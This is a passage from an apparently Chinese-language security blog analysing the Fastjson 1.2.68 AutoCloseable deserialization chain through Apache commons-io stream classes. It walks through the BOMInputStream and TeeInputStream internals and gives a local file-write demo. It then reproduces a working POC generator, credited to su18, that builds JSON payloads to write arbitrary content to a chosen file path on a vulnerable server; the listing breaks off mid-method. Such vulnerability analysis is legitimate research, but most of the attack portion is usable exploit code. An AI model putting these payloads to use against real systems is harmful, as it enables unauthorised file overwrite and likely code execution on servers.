class_">ByteOrderMark</span>(<span class="string">&quot;UTF-16BE&quot;</span>, <span class="number">0xFE</span>, <span class="number">0xFF</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/** UTF-16LE BOM (Little-Endian) */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">ByteOrderMark</span> <span class="variable">UTF_16LE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteOrderMark</span>(<span class="string">&quot;UTF-16LE&quot;</span>, <span class="number">0xFF</span>, <span class="number">0xFE</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * UTF-32BE BOM (Big-Endian)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">ByteOrderMark</span> <span class="variable">UTF_32BE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteOrderMark</span>(<span class="string">&quot;UTF-32BE&quot;</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xFE</span>, <span class="number">0xFF</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * UTF-32LE BOM (Little-Endian)</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@since</span> 2.2</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">ByteOrderMark</span> <span class="variable">UTF_32LE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteOrderMark</span>(<span class="string">&quot;UTF-32LE&quot;</span>, <span class="number">0xFF</span>, <span class="number">0xFE</span>, <span class="number">0x00</span>, <span class="number">0x00</span>);</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">BOMInputStream与TeeInputStream都继承了父类ProxyInputStream，其初始化参数delegate接收InputStream，使用父类构造方法放入this.in中，boms是ByteOrderMark类的可变参数数组，用来指定不同编码的BOM头部，会处理成List对象存入this.boms中。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// org.apache.commons.io.input.BOMInputStream</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">BOMInputStream</span><span class="params">(<span class="keyword">final</span> InputStream delegate, <span class="keyword">final</span> <span class="type">boolean</span> include, <span class="keyword">final</span> ByteOrderMark... boms)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(delegate);</span><br><span class="line">    <span class="keyword">if</span> (boms == <span class="literal">null</span> || boms.length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;No BOMs specified&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">this</span>.include = include;</span><br><span class="line">    <span class="comment">// Sort the BOMs to match the longest BOM first because some BOMs have the same starting two bytes.</span></span><br><span class="line">    Arrays.sort(boms, ByteOrderMarkLengthComparator);</span><br><span class="line">    <span class="built_in">this</span>.boms = Arrays.asList(boms);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// org.apache.commons.io.input.ProxyInputStream</span></span><br><span class="line"><span class="keyword">public</span> <span class="title function_">ProxyInputStream</span><span class="params">(<span class="keyword">final</span> InputStream proxy)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>(proxy);</span><br><span class="line">    <span class="comment">// the proxy is stored in a protected superclass variable named &#x27;in&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// java.io.FilterInputStream</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">volatile</span> InputStream in;</span><br><span class="line"><span class="keyword">protected</span> <span class="title function_">FilterInputStream</span><span class="params">(InputStream in)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.in = in;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">ByteOrderMark就是commons-io包对流中BOM头部的封装，这个类接收charsetName和名为bytes的可变参数int数组，这个int数组用来表示不同编码的字节顺序标记的表示。</font></p><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735021881637-5cced3aa-3bcd-4edb-a74d-5fe27cc8bf7f.png"></p><p><font style="color:#000000;">BOMInputStream中存在一个getBOM方法，这个方法原本的作用就是根据类初始化时传入的InputStream对象以及ByteOrderMark配置，在流中读取对应的ByteOrderMark。这个方法创建了一个for循环，根据类初始化时的ByteOrderMark的int数组长度，调用this.in的read方法在流中循环读取相应长度的数据。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> ByteOrderMark <span class="title function_">getBOM</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">if</span> (firstBytes == <span class="literal">null</span>) &#123;</span><br><span class="line">        fbLength = <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// BOMs are sorted from longest to shortest</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">int</span> <span class="variable">maxBomSize</span> <span class="operator">=</span> boms.get(<span class="number">0</span>).length();</span><br><span class="line">        firstBytes = <span class="keyword">new</span> <span class="title class_">int</span>[maxBomSize];</span><br><span class="line">        <span class="comment">// Read first maxBomSize bytes</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; firstBytes.length; i++) &#123;</span><br><span class="line">            firstBytes[i] = in.read();</span><br><span class="line">            fbLength++;</span><br><span class="line">            <span class="keyword">if</span> (firstBytes[i] &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// match BOM in firstBytes</span></span><br><span class="line">        byteOrderMark = find();</span><br><span class="line">        <span class="keyword">if</span> (byteOrderMark != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (!include) &#123;</span><br><span class="line">                <span class="keyword">if</span> (byteOrderMark.length() &lt; firstBytes.length) &#123;</span><br><span class="line">                    fbIndex = byteOrderMark.length();</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    fbLength = <span class="number">0</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> byteOrderMark;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><font style="color:#000000;">将上文的各步骤合到一块，大致逻辑如下：</font></p><ol><li><font style="color:#000000;">BOMInputStream初始化一个TeeInputStream和一个ByteOrderMark数组，里面存放了一个指定长度的int数组，用来读取相应长度的输入流</font></li><li><font style="color:#000000;">TeeInputStream初始化了一个CharSequenceInputStream和WriterOutputStream，无论调用TeeInputStream的任意一个read方法，都会将读取的内容同步调用WriterOutputStream的write方法写入其中</font></li><li><font style="color:#000000;">CharSequenceInputStream初始化输入的字符串（实际上是CharSequence对象）、字符编码、以及缓冲区大小（最大255）用于创建InputStream对象</font></li><li><font style="color:#000000;">WriterOutputStream初始化FileWriterWithEncoding以及一些属性，WriterOutputStream的write方法会将字节进行写入，如果参数writeImmediately为true，会调用OutputStreamWriter的write方法进行写出</font></li></ol><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.commons.io.ByteOrderMark;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.input.BOMInputStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.input.CharSequenceInputStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.input.TeeInputStream;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.output.FileWriterWithEncoding;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.output.WriterOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonIODemo</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">CharSequenceInputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CharSequenceInputStream</span>(<span class="string">&quot;testtest&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="number">8</span>);</span><br><span class="line">        <span class="type">FileWriterWithEncoding</span> <span class="variable">fileWriter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileWriterWithEncoding</span>(<span class="string">&quot;/Users/alphag0/Desktop/Code/Java/JavaSecCode/src/main/java/org/example/fastjson/test.txt&quot;</span>, <span class="string">&quot;UTF-8&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">        <span class="type">WriterOutputStream</span> <span class="variable">outputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">WriterOutputStream</span>(fileWriter, <span class="string">&quot;UTF-8&quot;</span>, <span class="number">8</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="type">TeeInputStream</span> <span class="variable">teeInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TeeInputStream</span>(inputStream, outputStream, <span class="literal">true</span>);</span><br><span class="line">        <span class="type">ByteOrderMark</span> <span class="variable">byteOrderMark</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteOrderMark</span>(<span class="string">&quot;UTF-8&quot;</span>, <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>&#125;);</span><br><span class="line">        <span class="type">BOMInputStream</span> <span class="variable">bomInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BOMInputStream</span>(teeInputStream, byteOrderMark);</span><br><span class="line">        bomInputStream.getBOM();</span><br><span class="line">        bomInputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2024/12/24/Cursory-Analysis-Of-Fastjson/1735022258058-5e288915-6771-4070-87be-ee07200b1473.png"></p><p><font style="color:#000000;">最后生成Payload的代码参考su18师傅给出的POC。</font></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.io.FileUtils;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * fastjson 1.2.68 autocloseable commons-io poc 生成工具类</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> su18</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">POC</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">AUTOCLOSEABLE_TAG</span> <span class="operator">=</span> <span class="string">&quot;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 在 payload 外包裹一层绕过指定类型</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> payload payload</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 返回结果</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">bypassSpecializedClass</span><span class="params">(String payload)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&#123;\&quot;su18\&quot;:&quot;</span> + payload + <span class="string">&quot;&#125;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 使用 Currency 类解析调用 &quot;currency&quot; 中 value 的 toString 方法，使用 JSONObject 方法调用 toJSONString</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> payload payload</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 返回结果</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">useCurrencyTriggerAllGetter</span><span class="params">(String payload, <span class="type">boolean</span> ref)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> String.format(<span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.util.Currency\&quot;,\&quot;val\&quot;:&#123;\&quot;currency\&quot;:%s%s&#125;&#125;%s&quot;</span>,</span><br><span class="line">(ref ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&#123;\&quot;su19\&quot;:&quot;</span>), payload, (ref ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&#125;&quot;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 生成 CharSequenceInputStream 反序列化字符串</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> content 写入内容</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> ref     是否使用引用对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 返回结果</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateCharSequenceInputStream</span><span class="params">(String content, <span class="type">boolean</span> ref)</span> &#123;</span><br><span class="line"><span class="type">int</span> <span class="variable">mod</span> <span class="operator">=</span> <span class="number">8192</span> - content.length() % <span class="number">8192</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">contentBuilder</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(content);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mod+<span class="number">1</span>; i++) &#123;</span><br><span class="line">contentBuilder.append(<span class="string">&quot; &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> String.format(<span class="string">&quot;&#123;%s\&quot;@type\&quot;:\&quot;org.apache.commons.io.input.CharSequenceInputStream\&quot;,&quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;charset\&quot;:\&quot;UTF-8\&quot;,\&quot;bufferSize\&quot;:4,\&quot;s\&quot;:&#123;\&quot;@type\&quot;:\&quot;java.lang.String\&quot;\&quot;%s\&quot;&#125;&quot;</span>,</span><br><span class="line">ref ? AUTOCLOSEABLE_TAG : <span class="string">&quot;&quot;</span>, contentBuilder);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 生成 FileWriterWithEncoding 反序列化字符串</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> filePath 要写入的文件位置</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> ref      是否使用引用对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 返回结果</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateFileWriterWithEncoding</span><span class="params">(String filePath, <span class="type">boolean</span> ref)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> String.format(<span class="string">&quot;&#123;%s\&quot;@type\&quot;:\&quot;org.apache.commons.io.output.FileWriterWithEncoding\&quot;,&quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;file\&quot;:\&quot;%s\&quot;,\&quot;encoding\&quot;:\&quot;UTF-8\&quot;&#125;&quot;</span>, ref ? AUTOCLOSEABLE_TAG : <span class="string">&quot;&quot;</span>, filePath);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 生成 WriterOutputStream 反序列化字符串</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> writer writer 对象反序列化字符串</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> ref    是否使用引用对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 返回结果</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateWriterOutputStream</span><span class="params">(String writer, <span class="type">boolean</span> ref)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> String.format(<span class="string">&quot;&#123;%s\&quot;@type\&quot;:\&quot;org.apache.commons.io.output.WriterOutputStream\&quot;,\&quot;writeImmediately\&quot;:true,&quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;bufferSize\&quot;:4,\&quot;charsetName\&quot;:\&quot;UTF-8\&quot;,\&quot;writer\&quot;:%s&#125;&quot;</span>,</span><br><span class="line">ref ? AUTOCLOSEABLE_TAG : <span class="string">&quot;&quot;</span>, writer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 生成 TeeInputStream 反序列化字符串</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> inputStream  inputStream 类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> outputStream outputStream 类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> ref          是否使用引用对象</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 返回结果</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateTeeInputStream</span><span class="params">(String inputStream, String outputStream, <span class="type">boolean</span> ref)</span> &#123;</span><br><span class="line"><span class="keyword">return</span> String.format(<span class="string">&quot;&#123;%s\&quot;@type\&quot;:\&quot;org.apache.commons.io.input.TeeInputStream\&quot;,\&quot;input\&quot;:%s,&quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;closeBranch\&quot;:true,\&quot;branch\&quot;:%s&#125;&quot;</span>, ref ? AUTOCLOSEABLE_TAG : <span class="string">&quot;&quot;</span>, inputStream, outputStream);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 生成 BOMInputStream 反序列化字符串</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> inputStream inputStream 类</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> size        读取 byte 大小</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 返回结果</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generateBOMInputStream</span><span class="params">(String inputStream, <span class="type">int</span> size)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="variable">nums</span> <span class="operator">=</span> size / <span class="number">8192</span>;</span><br><span class="line"><span class="type">int</span> <span class="variable">mod</span>  <span class="operator">=</span> size % <span class="number">8192</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (mod != <span class="number">0</span>) &#123;</span><br><span class="line">nums = nums + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">StringBuilder</span> <span class="variable">bytes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>(<span class="string">&quot;0&quot;</span>);</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums * <span class="number">8192</span>; i++) &#123;</span><br><span class="line">bytes.append(<span class="string">&quot;,0&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> String.format(<span class="string">&quot;&#123;%s\&quot;@type\&quot;:\&quot;org.apache.commons.io.input.BOMInputStream\&quot;,\&quot;delegate\&quot;:%s,&quot;</span> +</span><br><span class="line"><span class="string">&quot;\&quot;boms\&quot;:[&#123;\&quot;charsetName\&quot;:\&quot;UTF-8\&quot;,\&quot;bytes\&quot;:[%s]&#125;]&#125;&quot;</span>,</span><br><span class="line">AUTOCLOSEABLE_TAG, inputStream, bytes);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 读取文件内容字符串</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> file 文件路径</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 返回字符串</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">readFile</span><span class="params">(File file)</span> &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">result = FileUtils.readFileToString(file);</span><br><span class="line">&#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">e.printStackTrace();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 生成普通 payload</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> payloadFile    写入文件本地存储位置</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> targetFilePath 写出目标文件位置</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span> 返回 payload</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">generatePayload</span><span class="params">(String payloadFile, String targetFilePath)</span> &#123;</span><br><span class="line"><span class="type">File</span>   <span class="variable">file</span>        <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(payloadFile);</span><br><span class="line"><span class="type">String</span> <span class="variable">fileContent</span> <span class="operator">=</span> readFile(file);</span><br><span class="line"><span class="keyword">if</span> (!<span class="string">&quot;&quot;</span>.equals(fileContent)) &#123;</span><br><span class="line"><span class="keyword">return</span> bypassSpecializedClass(</span><br><span class="line">useCurrencyTriggerAllGetter(</span><br><span class="line">generateBOMInputStream(</span><br><span class="line">generateTeeInputStream(generateCharSequenceInputStream(fileContent, <span class="literal">false</span>),</span><br><span 